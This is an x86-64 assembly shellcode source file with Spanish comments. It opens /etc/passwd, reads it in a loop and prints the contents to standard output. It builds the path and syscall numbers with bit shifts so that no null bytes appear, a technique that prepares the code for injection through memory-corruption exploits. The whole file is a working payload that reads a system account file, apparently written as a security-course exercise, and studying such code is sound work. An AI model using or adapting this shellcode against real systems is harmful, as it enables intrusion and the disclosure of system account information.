# as shellcode.s -o shellcode.o
# ld shellcode.o -o shellcode

.global _start

.text

_start:
	### OPEN ###
	mov	$0x100fffffffffffff, %r13  # guardamos el espacio que queremos reservar en la pila (256) en %r13
	shr	$52, %r13
	sub	%r13, %rsp  # reservamos espacio en la pila (%r13 = 256)
	
	xor	%r12, %r12  # %r12 contendrá un 0 que nos será útil
	
	# Relleno el path con "/" ya que no influye y evito desplazamientos
	mov	$0x6374652f2f2f2f2f, %r10  # ponemos cte///// en hexadecimal en %r10
	mov	$0x6477737361702fff, %r11  # ponemos dwssap/ en hexadecimal en %r11 rellenado con f
	shr	$8, %r11  # ponemos el \0 al principio del dwssap/
	
	push	%r11  # hacemos un push con %r11 primero para que arriba de la pila quede el principio del string
	push	%r10  # metemos arriba el prinicipio del string
	
	mov	$0x2fffffffffffffff, %rax
	shr	$60, %rax
	mov	%rsp, %rdi  # en vez de $file utilizamos la pila (donde estara almacenado "/etc/passwd")
	xor	%rdx, %rdx  # ponemos 0 en rdx
	mov	$0x1a4fffffffffffff, %rsi
	shr	$52, %rsi
	syscall	
	
	mov	%rax, %r8
	cmp	%r12, %rax  # %r12 = 0
	jl	error

loop:
	### READ ###	
	xor	%rax, %rax  # ponemos 0 en rax
	mov	%r8, %rdi
	mov	%rsp, %rsi
	mov	%r13, %rdx  # %r13 = 256
	syscall

	mov	%rax, %r9
	cmp	%r12, %rax  # %r12 = 0
	js	error
	jz	exit

	### WRITE ###
	mov	$0x1fffffffffffffff, %rax
	shr	$60, %rax
	mov	$0x1fffffffffffffff, %rdi
	shr	$60, %rdi
	mov	%rsp, %rsi  
	mov	%r9, %rdx
	syscall

	jmp	loop

exit:
	### CLOSE ###
	mov	$0x3fffffffffffffff, %rax
	shr	$60, %rax
	mov	%r8, %rdi
	syscall

	### EXIT ###
	mov	$0x3cffffffffffffff, %rax
	shr	$56, %rax
	xor	%rdi, %rdi  # ponemos 0 en rdi
	syscall

error:
	### ERROR EXIT ###
	mov	$0x3cffffffffffffff, %rax
	shr	$56, %rax
	mov	$0x1fffffffffffffff, %rdi
	shr	$60, %rdi

	syscall
	
	